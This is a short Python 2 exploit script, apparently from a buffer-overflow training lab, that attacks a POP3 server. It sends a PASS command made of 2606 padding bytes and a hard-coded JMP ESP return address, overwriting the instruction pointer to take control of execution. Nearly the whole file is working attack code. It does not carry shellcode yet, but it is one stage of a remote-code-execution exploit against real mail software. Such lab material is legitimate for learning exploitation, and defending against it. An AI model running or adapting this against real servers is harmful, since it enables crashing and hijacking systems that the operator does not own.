#!/usr/bin/env python
"""
🦅 EIP Jumper
Verifying we can overwrite the Instruction Pointer (EIP). 🎯
If this works, we control execution flow! 🕹️
"""

import socket

def test_eip_control():
    # 🎯 Target Info
    target_ip = '192.168.250.136'
    target_port = 110 # POP3
    
    # 📏 Offset Configuration
    # Found via fuzzing/pattern tools
    offset = 2606
    
    # 🎯 EIP Overwrite
    # \x8f\x35\x4a\x5f is the address we want EIP to point to
    # (Typically a 'JMP ESP' instruction)
    eip = "\x8f\x35\x4a\x5f" 
    
    # 🧱 Padding
    padding_c = "C" * 390
    
    # 📦 Payload Construction
    # [OFFSET 'A's] + [EIP] + [Padding 'C's]
    payload = "A" * offset + eip + padding_c
    
    print "\n🦅 EIP Jump Test Initiated!"
    print "   🎯 Target: " + target_ip + ":" + str(target_port)
    print "   📏 Offset: " + str(offset)
    print "   🕹️  EIP:    " + repr(eip)
    print "   📦 Total Size: " + str(len(payload))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        print "   👋 Connected!"
        print "      " + s.recv(1024).strip()
        
        print "   👤 Sending USER..."
        s.send('USER root\r\n')
        print "      " + s.recv(1024).strip()
        
        print "   🔑 Sending Malicious PASS..."
        s.send('PASS ' + payload + '\r\n')
        
        print "      " + s.recv(1024).strip()
        print "   ✅ Done! Check debugger for EIP overwrite."
        
        s.close()
        
    except Exception as e:
        print "   ❌ Connection Error: " + str(e)

if __name__ == "__main__":
    test_eip_control()
